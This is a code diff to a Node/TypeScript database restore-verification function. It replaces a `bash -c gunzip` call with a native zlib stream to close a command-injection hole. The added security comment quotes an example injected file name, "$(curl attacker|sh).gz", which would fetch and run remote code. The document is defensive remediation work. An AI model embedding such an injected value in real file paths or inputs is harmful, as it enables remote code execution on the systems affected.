@@ -17,9 +17,11 @@
 
 import { spawn } from "node:child_process";
 import { createHash } from "node:crypto";
-import { promises as fs } from "node:fs";
+import { createReadStream, createWriteStream, promises as fs } from "node:fs";
 import os from "node:os";
 import path from "node:path";
+import { pipeline } from "node:stream/promises";
+import { createGunzip } from "node:zlib";
 import { Pool } from "pg";
 import { db } from "@workspace/db";
 import { radiologyOpsChecksTable } from "@workspace/db/schema";
@@ -168,9 +170,22 @@ export async function runRestoreVerification(
       const integrity = await run("gzip", ["-t", sqlPath]);
       if (!step("gzip_integrity", integrity.code === 0, integrity.code === 0 ? "gzip -t OK" : integrity.stderr)) return finish(false);
       const out = sqlPath.replace(/\.gz$/, "") + `.${Date.now()}.sql`;
-      const gunzip = await run("bash", ["-c", `gunzip -c ${JSON.stringify(sqlPath)} > ${JSON.stringify(out)}`]);
+      // SECURITY (INJ-1): Use Node native zlib stream instead of `bash -c gunzip`.
+      // The previous `bash -c` call with JSON.stringify(sqlPath) was vulnerable to
+      // command injection — $() and backticks are interpreted by bash inside double
+      // quotes, so a backupPath like "$(curl attacker|sh).gz" would achieve RCE.
+      // The stream pipeline passes file paths as OS-level arguments with no shell.
+      try {
+        await pipeline(
+          createReadStream(sqlPath),
+          createGunzip(),
+          createWriteStream(out),
+        );
+      } catch (err) {
+        return finish(step("decompress", false, err instanceof Error ? err.message : String(err)) && false);
+      }
       tempFiles.push(out);
-      if (!step("decompress", gunzip.code === 0, gunzip.code === 0 ? "decompressed" : gunzip.stderr)) return finish(false);
+      if (!step("decompress", true, "decompressed via zlib stream")) return finish(false);
       sqlPath = out;
     }
 
